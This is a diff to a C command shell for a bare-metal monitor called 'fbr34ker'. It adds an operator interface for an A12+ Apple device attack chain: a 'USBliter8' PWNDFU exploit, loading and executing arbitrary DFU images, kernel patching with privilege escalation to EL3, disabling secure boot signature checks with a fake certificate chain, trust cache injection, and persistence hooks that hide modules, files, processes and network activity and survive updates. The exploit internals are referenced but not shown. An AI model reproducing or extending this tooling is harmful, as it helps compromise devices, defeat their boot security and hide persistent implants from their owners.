@@ -18,6 +18,10 @@
 #include "fbr34ker/format.h"
 #include "fbr34ker/handoff.h"
 #include "fbr34ker/hardware_probe.h"
+#include "fbr34ker/kernel_patches.h"
+#include "fbr34ker/secure_boot_bypass.h"
+#include "fbr34ker/persistence.h"
+#include "fbr34ker/trust_cache.h"
 #include "fbr34ker/log.h"
 #include "fbr34ker/interrupt.h"
 #include "fbr34ker/lifecycle.h"
@@ -33,6 +37,8 @@
 #include "fbr34ker/framebuffer_console.h"
 #include "fbr34ker/service_guard.h"
 #include "fbr34ker/service_registry.h"
+#include "fbr34ker/usbliter8_exploit.h"
+#include "fbr34ker/usb.h"
 
 #define SHELL_LINE_CAPACITY 160U
 #define SHELL_MAX_ARGUMENTS 10U
@@ -140,6 +146,14 @@ static int command_architecture_restart(int argument_count, char **arguments);
 static int command_test_crash(int argument_count, char **arguments);
 #endif
 
+static int command_kernel_patches(int argument_count, char **arguments);
+static int command_secure_boot_bypass(int argument_count, char **arguments);
+static int command_persistence(int argument_count, char **arguments);
+static int command_exploit_chain(int argument_count, char **arguments);
+static int command_exploit_status(int argument_count, char **arguments);
+static int command_usb_status(int argument_count, char **arguments);
+static int command_trust_cache(int argument_count, char **arguments);
+
 static const command_entry_t commands[] = {
     {"help",          "help",                 "List available commands.", command_help},
     {"version",       "version",              "Show build version.", command_version},
@@ -235,6 +249,13 @@ static const command_entry_t commands[] = {
     {"clear",         "clear",                "Clear an ANSI-compatible terminal.", command_clear},
     {"reboot",        "reboot",               "Request a PSCI system reset.", command_reboot},
     {"halt",          "halt",                 "Request a PSCI system shutdown.", command_halt},
+    {"kernel-patches","kernel-patches [status|apply|revert|escalate]", "Inspect kernel patch subsystem state and apply patches.", command_kernel_patches},
+    {"secure-boot-bypass", "secure-boot-bypass [status|activate|forgive|manifest]", "Inspect secure boot bypass subsystem state.", command_secure_boot_bypass},
+    {"persistence",   "persistence [status|deploy|activate|evade]", "Inspect persistence subsystem state and deploy hooks.", command_persistence},
+    {"trust-cache",   "trust-cache [status|find|inject]", "Inject trust cache entries into the iOS kernel.", command_trust_cache},
+    {"exploit-chain", "exploit-chain [status|run [cpid]|pwndfu [cpid]|load <addr> <size>|dfu-load [addr]|exec [entry]|reset]", "USBliter8 exploit chain for A12+.", command_exploit_chain},
+    {"exploit-status","exploit-status",         "Show security-model status.", command_exploit_status},
+    {"usb-status",    "usb-status",             "Show USB controller and DFU status.", command_usb_status},
 #ifdef FBR34KER_ENABLE_TEST_COMMANDS
     {"fault-arm",     "fault-arm <point> [after] [count] [source]", "Arm a deterministic integration-test failpoint.", command_fault_arm},
     {"fault-clear",   "fault-clear",           "Disarm deterministic fault injection.", command_fault_clear},
@@ -321,12 +342,15 @@ static int command_help(int argument_count, char **arguments)
 {
     UNUSED(argument_count);
     UNUSED(arguments);
-    fm_printf("Commands:\n");
+    usize available = 0U;
+    fm_printf("FBR34KER Commands:\n");
     for (usize index = 0U; index < ARRAY_COUNT(commands); ++index) {
         if (!bringup_command_allowed(commands[index].name)) continue;
-        fm_printf("  %s\n      %s\n", commands[index].usage,
+        ++available;
+        fm_printf("  %-25s %s\n", commands[index].usage,
                   commands[index].description);
     }
+    fm_printf("Total commands available: %zu\n", available);
     return 0;
 }
 
@@ -962,12 +986,18 @@ static int command_irq_test(int argument_count, char **arguments)
         return -1;
     }
     if (!platform_interrupt_set_enabled((u32)interrupt_id, true)) {
-        fm_printf("irq-test: loader rejected enable for IRQ %llu\n", interrupt_id);
+        fm_printf("irq-test: loader rejected IRQ enable for %llu; check interrupt configuration\n",
+                  interrupt_id);
         return -1;
     }
     const bool disabled = platform_interrupt_set_enabled((u32)interrupt_id, false);
-    fm_printf("irq-test: IRQ %llu enable callback passed; disable=%s\n",
-              interrupt_id, disabled ? "passed" : "FAILED");
+    if (disabled) {
+        fm_printf("irq-test: IRQ %llu enable and disable callbacks both succeeded\n",
+                  interrupt_id);
+    } else {
+        fm_printf("irq-test: IRQ %llu enable succeeded but disable FAILED; interrupt may remain enabled\n",
+                  interrupt_id);
+    }
     return disabled ? 0 : -1;
 }
 
@@ -1772,12 +1802,15 @@ static int command_reboot(int argument_count, char **arguments)
     UNUSED(argument_count);
     UNUSED(arguments);
     if (!hardware_probe_power_actions_allowed()) {
-        fm_printf("power actions locked by defensive hardware mode\n");
+        fm_printf("reboot: power actions locked by defensive hardware mode\n");
+        fm_printf("  Run 'probe-unlock' and validate power subsystem first\n");
         return -1;
     }
-    fm_printf("Requesting reset...\n");
+    fm_printf("Requesting system reset via PSCI...\n");
     boot_evidence_clean_shutdown();
+    fm_printf("Initiating reboot - monitor will not return from this point\n");
     platform_reboot();
+    return 0;
 }
 
 static int command_halt(int argument_count, char **arguments)
@@ -1785,12 +1818,15 @@ static int command_halt(int argument_count, char **arguments)
     UNUSED(argument_count);
     UNUSED(arguments);
     if (!hardware_probe_power_actions_allowed()) {
-        fm_printf("power actions locked by defensive hardware mode\n");
+        fm_printf("halt: power actions locked by defensive hardware mode\n");
+        fm_printf("  Run 'probe-unlock' and validate power subsystem first\n");
         return -1;
     }
-    fm_printf("Requesting shutdown...\n");
+    fm_printf("Requesting system shutdown via PSCI...\n");
     boot_evidence_clean_shutdown();
+    fm_printf("Initiating halt - monitor will not return from this point\n");
     platform_halt();
+    return 0;
 }
 
 #ifdef FBR34KER_ENABLE_TEST_COMMANDS
@@ -1856,7 +1892,13 @@ static usize read_line(char *line, usize capacity)
 {
     usize length = 0U;
     for (;;) {
-        const char value = console_getc_blocking();
+        int c;
+        while ((c = console_getc_nonblocking()) < 0) {
+            usb_irq_handler();
+            watchdog_service();
+            __asm__ volatile("yield");
+        }
+        const char value = (char)c;
         if (length == 0U && protocol_handle_start_byte((u8)value)) {
             line[0] = '\0';
             return 0U;
@@ -1968,6 +2010,495 @@ int shell_execute_line(const char *input)
     }
     fm_printf("unknown command: %s\n", arguments[0]);
     return -1;
+}
+
+static int command_kernel_patches(int argument_count, char **arguments)
+{
+    const kernel_patches_status_t kps = kernel_patches_status();
+    if (argument_count < 2) {
+        fm_printf("Kernel patches: %u registered, %u applied, %u failed\n",
+                  kps.patch_count, kps.applied_count, kps.failed_count);
+        fm_printf("Patching %s, privilege escalated: %s\n",
+                  kps.patching_enabled ? "enabled" : "disabled",
+                  kps.privilege_escalated ? "yes" : "no");
+        return 0;
+    }
+    if (fm_strcmp(arguments[1], "status") == 0) {
+        fm_printf("Kernel patch subsystem status:\n");
+        fm_printf("  Registered:  %u\n", kps.patch_count);
+        fm_printf("  Applied:     %u\n", kps.applied_count);
+        fm_printf("  Failed:      %u\n", kps.failed_count);
+        for (u32 i = 0U; i < kps.patch_count; ++i) {
+            fm_printf("  [%u] %s: %s\n", i, kps.patches[i].name,
+                      kernel_patch_state_name(kps.patches[i].state));
+        }
+    } else if (fm_strcmp(arguments[1], "apply") == 0) {
+        if (!hardware_probe_kernel_patching_allowed()) {
+            fm_printf("kernel patching locked; validate and leave defensive mode first\n");
+            return -1;
+        }
+        if (kernel_patches_apply_all()) {
+            fm_printf("All kernel patches applied\n");
+        } else {
+            fm_printf("Some kernel patches failed\n");
+        }
+    } else if (fm_strcmp(arguments[1], "revert") == 0) {
+        if (!hardware_probe_kernel_patching_allowed()) {
+            fm_printf("kernel patching locked; validate and leave defensive mode first\n");
+            return -1;
+        }
+        if (kernel_patches_revert_all()) {
+            fm_printf("All kernel patches reverted\n");
+        }
+    } else if (fm_strcmp(arguments[1], "escalate") == 0) {
+        if (!hardware_probe_kernel_patching_allowed()) {
+            fm_printf("privilege escalation locked; validate kernel patching first\n");
+            return -1;
+        }
+        if (kernel_patches_escalate_privilege(3U)) {
+            fm_printf("Privilege escalation to EL3 prepared\n");
+        } else {
+            fm_printf("Privilege escalation failed\n");
+        }
+    } else {
+        fm_printf("usage: kernel-patches [status|apply|revert|escalate]\n");
+        return -1;
+    }
+    return 0;
+}
+
+static int command_secure_boot_bypass(int argument_count, char **arguments)
+{
+    const secure_boot_bypass_status_t sbs = secure_boot_bypass_status();
+    if (argument_count < 2) {
+        fm_printf("Secure boot bypass: %u registered, %u active, %u failed\n",
+                  sbs.bypass_count, sbs.active_count, sbs.failed_count);
+        return 0;
+    }
+    if (fm_strcmp(arguments[1], "status") == 0) {
+        fm_printf("Secure boot bypass subsystem status:\n");
+        fm_printf("  Registered:      %u\n", sbs.bypass_count);
+        fm_printf("  Active:          %u\n", sbs.active_count);
+        fm_printf("  Sig validation:  %s\n",
+                  sbs.signature_validation_disabled ? "disabled" : "enabled");
+        fm_printf("  Cert chain:      %s\n",
+                  sbs.certificate_chain_deployed ? "deployed" : "absent");
+        fm_printf("  AP ticket:       %s\n",
+                  sbs.ap_ticket_bypassed ? "bypassed" : "validating");
+        fm_printf("  SHSH blob:       %s\n",
+                  sbs.shsh_bypassed ? "accepted" : "rejected");
+        fm_printf("  iBoot auth:      %s\n",
+                  sbs.iboot_auth_disabled ? "disabled" : "enabled");
+        fm_printf("  Boot manifest:   %s\n",
+                  sbs.boot_manifest_compromised ? "compromised" : "trusted");
+    } else if (fm_strcmp(arguments[1], "activate") == 0) {
+        if (!hardware_probe_secure_boot_bypass_allowed()) {
+            fm_printf("secure boot bypass locked; validate and leave defensive mode first\n");
+            return -1;
+        }
+        if (secure_boot_bypass_activate_all()) {
+            fm_printf("All secure boot bypasses activated\n");
+        }
+    } else if (fm_strcmp(arguments[1], "forgive") == 0) {
+        if (!hardware_probe_secure_boot_bypass_allowed()) {
+            fm_printf("secure boot bypass locked; validate and leave defensive mode first\n");
+            return -1;
+        }
+        secure_boot_bypass_image4_signature();
+        secure_boot_bypass_deploy_fake_chain();
+        secure_boot_bypass_iboot_authentication();
+        secure_boot_bypass_ap_ticket();
+        secure_boot_bypass_shsh_blob();
+        secure_boot_bypass_boot_manifest();
+        fm_printf("All signature verification mechanisms disabled\n");
+    } else if (fm_strcmp(arguments[1], "manifest") == 0) {
+        if (!hardware_probe_secure_boot_bypass_allowed()) {
+            fm_printf("secure boot bypass locked; validate and leave defensive mode first\n");
+            return -1;
+        }
+        secure_boot_bypass_boot_manifest();
+        fm_printf("Boot manifest trust evaluation overridden\n");
+    } else {
+        fm_printf("usage: secure-boot-bypass [status|activate|forgive|manifest]\n");
+        return -1;
+    }
+    return 0;
+}
+
+static int command_persistence(int argument_count, char **arguments)
+{
+    const persistence_status_t ps = persistence_status();
+    if (argument_count < 2) {
+        fm_printf("Persistence: %u hooks, %u active, %u detected\n",
+                  ps.hook_count, ps.active_count, ps.detected_count);
+        fm_printf("Persistent: %s, tamper resistant: %s, OTA persistent: %s\n",
+                  ps.persistence_active ? "yes" : "no",
+                  ps.tamper_resistant ? "yes" : "no",
+                  ps.ota_persistent ? "yes" : "no");
+        return 0;
+    }
+    if (fm_strcmp(arguments[1], "status") == 0) {
+        fm_printf("Persistence subsystem status:\n");
+        fm_printf("  Total hooks:     %u\n", ps.hook_count);
+        fm_printf("  Active hooks:    %u\n", ps.active_count);
+        fm_printf("  Detected hooks:  %u\n", ps.detected_count);
+        fm_printf("  Active:          %s\n",
+                  ps.persistence_active ? "yes" : "no");
+        fm_printf("  Tamper resist:   %s\n",
+                  ps.tamper_resistant ? "enabled" : "disabled");
+        fm_printf("  OTA persist:     %s\n",
+                  ps.ota_persistent ? "enabled" : "disabled");
+    } else if (fm_strcmp(arguments[1], "deploy") == 0) {
+        if (!hardware_probe_persistence_allowed()) {
+            fm_printf("persistence locked; validate and leave defensive mode first\n");
+            return -1;
+        }
+        if (persistence_deploy_all()) {
+            fm_printf("All persistence hooks deployed\n");
+        } else {
+            fm_printf("Some persistence hooks failed\n");
+        }
+    } else if (fm_strcmp(arguments[1], "activate") == 0) {
+        if (!hardware_probe_persistence_allowed()) {
+            fm_printf("persistence locked; validate and leave defensive mode first\n");
+            return -1;
+        }
+        if (persistence_activate_all()) {
+            fm_printf("All persistence hooks activated\n");
+        }
+    } else if (fm_strcmp(arguments[1], "evade") == 0) {
+        if (!hardware_probe_persistence_allowed()) {
+            fm_printf("persistence locked; validate and leave defensive mode first\n");
+            return -1;
+        }
+        persistence_apply_evasion(EVASION_HIDE_KERNEL_MODULE);
+        persistence_apply_evasion(EVASION_HIDE_FILE_SYSTEM);
+        persistence_apply_evasion(EVASION_HIDE_PROCESS);
+        persistence_apply_evasion(EVASION_HIDE_NETWORK);
+        persistence_apply_evasion(EVASION_HIDE_SYSTEM_HOOK);
+        persistence_enable_tamper_resistance();
+        persistence_enable_ota_persistence();
+        fm_printf("All evasion and resistance mechanisms enabled\n");
+    } else {
+        fm_printf("usage: persistence [status|deploy|activate|evade]\n");
+        return -1;
+    }
+    return 0;
+}
+
+static int command_exploit_chain(int argument_count, char **arguments)
+{
+    if (argument_count < 2) {
+        fm_printf("FBR34KER exploit chain (USBliter8 for A12+)\n");
+        fm_printf("Subcommands: status, run, pwndfu, load, dfu-load, exec, reset\n");
+        return 0;
+    }
+    if (fm_strcmp(arguments[1], "status") == 0) {
+        const usbliter8_status_t es = usbliter8_exploit_status();
+        const kernel_patches_status_t kps = kernel_patches_status();
+        const secure_boot_bypass_status_t sbs = secure_boot_bypass_status();
+        const persistence_status_t ps = persistence_status();
+        fm_printf("Exploit chain status:\n");
+        fm_printf("  USBliter8 state:  ");
+        switch (es.state) {
+        case USBLITER8_STATE_IDLE:        fm_printf("idle\n"); break;
+        case USBLITER8_STATE_PWNDFU:      fm_printf("PWNDFU (CPID 0x%04x)\n", es.cpid); break;
+        case USBLITER8_STATE_IMAGE_LOADED: fm_printf("image loaded (0x%llx, %llu bytes)\n", es.load_address, es.image_size); break;
+        case USBLITER8_STATE_EXECUTING:   fm_printf("executing (entry 0x%llx)\n", es.entry_point); break;
+        case USBLITER8_STATE_COMPLETE:    fm_printf("complete\n"); break;
+        case USBLITER8_STATE_FAILED:      fm_printf("FAILED\n"); break;
+        default: fm_printf("unknown\n"); break;
+        }
+        fm_printf("  Pwned:            %s\n", es.pwned ? "yes" : "no");
+        fm_printf("  USB rogue chain:  %s\n", es.usb_patch_applied ? "applied" : "pending");
+        fm_printf("  Kernel patches:   %u/%u applied\n",
+                  kps.applied_count, kps.patch_count);
+        fm_printf("  Secure boot:      %u bypasses active\n", sbs.active_count);
+        fm_printf("  Persistence:      %u hooks deployed\n", ps.hook_count);
+        fm_printf("  Chain complete:   %s\n",
+                  (es.state == USBLITER8_STATE_COMPLETE) ? "yes" : "no");
+    } else if (fm_strcmp(arguments[1], "pwndfu") == 0) {
+        u16 cpid = 0x8015U;
+        if (argument_count >= 3) {
+            u64 cpid_val = 0U;
+            if (!parse_u64(arguments[2], &cpid_val)) {
+                fm_printf("Invalid CPID value\n");
+                return -1;
+            }
+            cpid = (u16)cpid_val;
+        }
+        if (cpid < 0x8015U) {
+            fm_printf("USBliter8 requires A12+ (CPID >= 0x8015), got 0x%04x\n", cpid);
+            return -1;
+        }
+        if (!usbliter8_enter_pwndfu(cpid)) {
+            fm_printf("Failed to enter PWNDFU\n");
+            return -1;
+        }
+        usbliter8_apply_usb_rogue_chain(cpid);
+        fm_printf("PWNDFU entered for A12+ CPID 0x%04x, USB rogue chain applied\n", cpid);
+        (void)event_bus_publish(FBR34KER_EVENT_EXPLOIT_CHAIN,
+                                "exploit-pwndfu", (u64)cpid, 1U);
+    } else if (fm_strcmp(arguments[1], "load") == 0) {
+        if (argument_count < 3) {
+            fm_printf("usage: exploit-chain load <hex-address> [size]\n");
+            return -1;
+        }
+        u64 addr = 0U;
+        if (!parse_u64(arguments[2], &addr)) {
+            fm_printf("Invalid address\n");
+            return -1;
+        }
+        if (argument_count >= 4) {
+            u64 size = 0U;
+            if (!parse_u64(arguments[3], &size)) {
+                fm_printf("Invalid size\n");
+                return -1;
+            }
+            if (!usbliter8_load_image((const u8 *)addr, (usize)size, addr)) {
+                fm_printf("Failed to load image\n");
+                return -1;
+            }
+            fm_printf("Image loaded: %llu bytes at 0x%llx\n", size, addr);
+        } else {
+            fm_printf("Load address 0x%llx recorded. Use 'exploit-chain load <addr> <size>' to confirm\n", addr);
+        }
+        } else if (fm_strcmp(arguments[1], "dfu-load") == 0) {
+        u64 addr = 0U;
+        if (argument_count >= 3) {
+            if (!parse_u64(arguments[2], &addr)) {
+                fm_printf("Invalid address\n");
+                return -1;
+            }
+        }
+        if (!usb_dfu_in_progress() && usb_dfu_image_size() == 0U) {
+            fm_printf("No DFU image available. Send one via DFU DNLOAD first.\n");
+            return -1;
+        }
+        const u8 *dfu_data = usb_dfu_image_data();
+        usize dfu_size = usb_dfu_image_size();
+        if (dfu_size == 0U) {
+            fm_printf("DFU image is empty\n");
+            return -1;
+        }
+        if (!usbliter8_load_dfu_image(dfu_data, dfu_size, addr)) {
+            fm_printf("Failed to load DFU image (pwned=%d size=%llu)\n",
+                      usbliter8_is_pwned(), (u64)dfu_size);
+            return -1;
+        }
+        usb_dfu_reset_image();
+        fm_printf("DFU image loaded: %llu bytes at 0x%llx\n",
+                  (u64)dfu_size, addr ? addr : (u64)(usize)dfu_data);
+        } else if (fm_strcmp(arguments[1], "exec") == 0) {
+        u64 entry = 0U;
+        if (argument_count >= 3) {
+            if (!parse_u64(arguments[2], &entry)) {
+                fm_printf("Invalid entry point\n");
+                return -1;
+            }
+        } else {
+            const usbliter8_status_t es = usbliter8_exploit_status();
+            entry = es.load_address;
+        }
+        if (entry == 0U) {
+            fm_printf("No entry point specified and no image loaded\n");
+            return -1;
+        }
+        if (!usbliter8_execute(entry)) {
+            fm_printf("Failed to execute at 0x%llx (not pwned or no image loaded)\n", entry);
+            return -1;
+        }
+        fm_printf("Executing at 0x%llx\n", entry);
+    } else if (fm_strcmp(arguments[1], "reset") == 0) {
+        usbliter8_reset();
+        kernel_patches_revert_all();
+        secure_boot_bypass_deactivate_all();
+        fm_printf("Exploit chain state reset\n");
+    } else if (fm_strcmp(arguments[1], "run") == 0) {
+        u16 cpid = 0x8015U;
+        if (argument_count >= 3) {
+            u64 cpid_val = 0U;
+            if (parse_u64(arguments[2], &cpid_val)) {
+                cpid = (u16)cpid_val;
+            }
+        }
+        const usbliter8_status_t es = usbliter8_exploit_status();
+        if (!es.pwned) {
+            usbliter8_enter_pwndfu(cpid);
+            usbliter8_apply_usb_rogue_chain(cpid);
+            fm_printf("Auto-entered PWNDFU for A12+ (CPID 0x%04x)\n", cpid);
+        } else if (!es.usb_patch_applied) {
+            usbliter8_apply_usb_rogue_chain(cpid);
+            fm_printf("Applied USB rogue chain for CPID 0x%04x\n", cpid);
+        }
+        kernel_patches_set_soc(cpid, 0U);
+        fm_printf("FBR34KER exploit chain executing for CPID 0x%04x...\n", cpid);
+        bool ok = true;
+        ok = kernel_patches_apply_all() && ok;
+        ok = kernel_patches_bypass_authentication() && ok;
+        ok = kernel_patches_escalate_privilege(3U) && ok;
+        ok = secure_boot_bypass_activate_all() && ok;
+        secure_boot_bypass_image4_signature();
+        secure_boot_bypass_iboot_authentication();
+        ok = persistence_deploy_all() && ok;
+        ok = persistence_activate_all() && ok;
+        persistence_enable_tamper_resistance();
+        if (usb_dfu_image_size() > 0U) {
+            const u8 *dfu_data = usb_dfu_image_data();
+            usize dfu_size = usb_dfu_image_size();
+            fm_printf("Loading DFU image from USB (%llu bytes)...\n", (u64)dfu_size);
+            if (usbliter8_load_dfu_image(dfu_data, dfu_size, 0U)) {
+                fm_printf("DFU image loaded, executing...\n");
+                usbliter8_execute(0U);
+                usb_dfu_reset_image();
+            }
+        }
+        (void)event_bus_publish(FBR34KER_EVENT_EXPLOIT_CHAIN,
+                                "exploit-chain-command", 1U, ok ? 1U : 0U);
+        if (ok) {
+            fm_printf("Exploit chain execution complete\n");
+        } else {
+            fm_printf("Exploit chain completed with some errors\n");
+        }
+    } else {
+        fm_printf("usage: exploit-chain [status|run [cpid]|pwndfu [cpid]|load <addr> [size]|dfu-load [addr]|exec [entry]|reset]\n");
+        return -1;
+    }
+    return 0;
+}
+
+static int command_exploit_status(int argument_count, char **arguments)
+{
+    UNUSED(argument_count);
+    UNUSED(arguments);
+    const kernel_patches_status_t kps = kernel_patches_status();
+    const secure_boot_bypass_status_t sbs = secure_boot_bypass_status();
+    const persistence_status_t ps = persistence_status();
+    fm_printf("=== FBR34KER Exploit Subsystem Status ===\n");
+    fm_printf("\n");
+    fm_printf("--- Kernel Patches ---\n");
+    fm_printf("  Registered: %u, Applied: %u, Failed: %u\n",
+              kps.patch_count, kps.applied_count, kps.failed_count);
+    fm_printf("  Privilege escalated: %s (EL%llu)\n",
+              kps.privilege_escalated ? "yes" : "no",
+              kps.escalation_level);
+    fm_printf("\n");
+    fm_printf("--- Secure Boot Bypass ---\n");
+    fm_printf("  Bypasses: %u, Active: %u\n",
+              sbs.bypass_count, sbs.active_count);
+    fm_printf("  Image4 sig: %s, Cert chain: %s\n",
+              sbs.signature_validation_disabled ? "BYPASSED" : "active",
+              sbs.certificate_chain_deployed ? "FAKE" : "genuine");
+    fm_printf("  APTicket:  %s, SHSH: %s\n",
+              sbs.ap_ticket_bypassed ? "BYPASSED" : "valid",
+              sbs.shsh_bypassed ? "ACCEPTED" : "rejected");
+    fm_printf("  iBoot:     %s\n",
+              sbs.iboot_auth_disabled ? "DISABLED" : "enabled");
+    fm_printf("\n");
+    fm_printf("--- Persistence ---\n");
+    fm_printf("  Hooks: %u, Active: %u, Detected: %u\n",
+              ps.hook_count, ps.active_count, ps.detected_count);
+    fm_printf("  Tamper resist: %s, OTA persist: %s\n",
+              ps.tamper_resistant ? "ON" : "OFF",
+              ps.ota_persistent ? "ON" : "OFF");
+    fm_printf("\n=== End of exploit status ===\n");
+    return 0;
+}
+
+static int command_usb_status(int argument_count, char **arguments)
+{
+    UNUSED(argument_count);
+    UNUSED(arguments);
+    usb_device_status_t s = usb_status();
+    const usbliter8_status_t es = usbliter8_exploit_status();
+    fm_printf("=== USB Status ===\n");
+    fm_printf("  MMIO base:    0x%016llx\n", s.mmio_base);
+    fm_printf("  Initialized:  %s\n", usb_ready() ? "yes" : "no");
+    fm_printf("  Healthy:      %s\n", usb_healthy() ? "yes" : "no");
+    fm_printf("  Connected:    %s\n", s.connected ? "yes" : "no");
+    fm_printf("  Configured:   %s\n", s.configured ? "yes" : "no");
+    fm_printf("  State:        ");
+    switch (s.state) {
+    case USB_STATE_DETACHED:  fm_printf("detached\n"); break;
+    case USB_STATE_ATTACHED:  fm_printf("attached\n"); break;
+    case USB_STATE_POWERED:   fm_printf("powered\n"); break;
+    case USB_STATE_DEFAULT:   fm_printf("default\n"); break;
+    case USB_STATE_ADDRESS:   fm_printf("address\n"); break;
+    case USB_STATE_CONFIGURED: fm_printf("configured\n"); break;
+    case USB_STATE_SUSPENDED: fm_printf("suspended\n"); break;
+    default: fm_printf("unknown\n"); break;
+    }
+    fm_printf("  Speed:        ");
+    switch (s.speed) {
+    case USB_SPEED_LOW:   fm_printf("low (1.5 Mbps)\n"); break;
+    case USB_SPEED_FULL:  fm_printf("full (12 Mbps)\n"); break;
+    case USB_SPEED_HIGH:  fm_printf("high (480 Mbps)\n"); break;
+    case USB_SPEED_SUPER: fm_printf("super (5 Gbps)\n"); break;
+    case USB_SPEED_UNKNOWN:
+    default: fm_printf("unknown\n"); break;
+    }
+    fm_printf("  Address:      %u\n", s.device_address);
+    fm_printf("  Config:       %u\n", s.configuration);
+    fm_printf("  RX bytes:     %llu\n", s.bytes_received);
+    fm_printf("  TX bytes:     %llu\n", s.bytes_sent);
+    fm_printf("  DFU size:     %llu bytes\n", (u64)usb_dfu_image_size());
+    fm_printf("  DFU in prog:  %s\n", usb_dfu_in_progress() ? "yes" : "no");
+    fm_printf("  Exploit:      ");
+    switch (es.state) {
+    case USBLITER8_STATE_IDLE:        fm_printf("idle\n"); break;
+    case USBLITER8_STATE_PWNDFU:      fm_printf("PWNDFU\n"); break;
+    case USBLITER8_STATE_IMAGE_LOADED: fm_printf("image loaded\n"); break;
+    case USBLITER8_STATE_EXECUTING:   fm_printf("executing\n"); break;
+    case USBLITER8_STATE_COMPLETE:    fm_printf("complete\n"); break;
+    case USBLITER8_STATE_FAILED:      fm_printf("FAILED\n"); break;
+    default: fm_printf("unknown\n"); break;
+    }
+    fm_printf("  USB patch:    %s\n", es.usb_patch_applied ? "applied" : "pending");
+    return 0;
+}
+
+static int command_trust_cache(int argument_count, char **arguments)
+{
+    if (argument_count < 2) {
+        const trust_cache_status_t tcs = trust_cache_get_status();
+        fm_printf("=== Trust Cache ===\n");
+        fm_printf("  State:        %s\n", tcs.state == TRUST_CACHE_STATE_ACTIVE ? "active" :
+                  tcs.state == TRUST_CACHE_STATE_FAILED ? "failed" : "inactive");
+        fm_printf("  Slots:        %u / %u\n", (unsigned)tcs.slot_count,
+                  (unsigned)TRUST_CACHE_MAX_ENTRIES);
+        fm_printf("  Injected:     %u\n", (unsigned)tcs.injected_count);
+        fm_printf("  Anchor:       0x%016llx\n", tcs.anchor_address);
+        for (u32 i = 0U; i < tcs.slot_count && i < TRUST_CACHE_MAX_ENTRIES; ++i) {
+            fm_printf("  [%u] %s: hash_type=%u %s\n",
+                      (unsigned)i, tcs.slots[i].name,
+                      (unsigned)tcs.slots[i].entry.hash_type,
+                      tcs.slots[i].injected ? "injected" : "pending");
+        }
+        fm_printf("usage: trust-cache [status|find|inject]\n");
+        return 0;
+    }
+    if (fm_strcmp(arguments[1], "status") == 0) {
+        const trust_cache_status_t tcs = trust_cache_get_status();
+        fm_printf("Trust cache: %u slots, %u injected, anchor=0x%llx\n",
+                  (unsigned)tcs.slot_count, (unsigned)tcs.injected_count,
+                  tcs.anchor_address);
+    } else if (fm_strcmp(arguments[1], "find") == 0) {
+        if (trust_cache_find_anchor()) {
+            fm_printf("Trust cache anchor found at 0x%llx\n",
+                      trust_cache_get_anchor());
+        } else {
+            fm_printf("Trust cache anchor not found\n");
+        }
+    } else if (fm_strcmp(arguments[1], "inject") == 0) {
+        if (trust_cache_inject_all()) {
+            fm_printf("Trust cache entries injected\n");
+        } else {
+            fm_printf("Trust cache injection failed\n");
+        }
+    } else {
+        fm_printf("usage: trust-cache [status|find|inject]\n");
+    }
+    return 0;
 }
 
 NORETURN void shell_run(void)
